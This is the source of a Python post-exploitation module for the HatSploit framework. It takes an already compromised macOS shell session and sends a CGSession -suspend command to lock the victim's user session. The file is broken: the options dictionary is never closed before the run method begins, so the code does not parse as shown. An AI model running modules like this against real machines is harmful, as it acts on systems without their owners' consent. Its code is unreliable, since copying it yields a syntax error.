#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.base.module import Module
from hatsploit.base.sessions import Sessions


class HatSploitModule(Module, Sessions):
    details = {
        'Name': "macOS Shell Suspend",
        'Module': "post/macos/shell/suspend",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Suspend macOS through shell.",
        'Comments': [
            ''
        ],
        'Platform': "macos",
        'Risk': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session",
            'Required': True
        },

    def run(self):
        session = self.parse_options(self.options)

        session = self.get_session('shell', 'macos', session)
        session.send_command("/System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend")
